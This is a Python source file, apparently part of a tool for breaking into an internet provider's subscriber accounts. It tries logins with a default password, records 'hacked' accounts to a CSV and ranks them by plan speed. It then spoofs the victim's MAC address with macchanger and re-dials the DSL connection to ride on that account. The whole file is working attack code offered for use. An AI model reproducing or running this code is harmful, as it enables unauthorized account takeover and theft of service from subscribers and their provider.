import attacks
from user import User
import os

TESTED = []


def init(args):
    global TESTED
    TESTED = args


def speed(plan):
    try:
        plan = plan[:plan.index('Mbps')]
        plan = plan[plan.rindex('_') + 1:]
        return int(plan)
    except:
        return 0


def test_login(username):
    if username not in TESTED:
        user = attacks.login(User(username[:-1]))

        if user:
            with open('resources/hacked.csv', 'a+') as file:
                file.write(str(user))

        with open('resources/tested.txt', 'a+') as file:
            file.write(username)


def get_hacked_users():
    users = []
    for i in open('resources/hacked.csv', 'r').readlines():
        try:
            account = i.split(',')
            user = User(account[0], '1234', account[1], speed(account[2]))
            users.append(user)
        except:
            pass

    return sorted(users, key=lambda x: x.plan, reverse=True)


def test_connection(user:User):
    os.popen('sudo poff -a')
    os.popen('sudo ifconfig eth0 down')
    os.popen(f'sudo macchanger -m {user.mac} eth0')
    os.popen('sudo ifconfig eth0 down')
    os.popen('pon dsl-provider')

    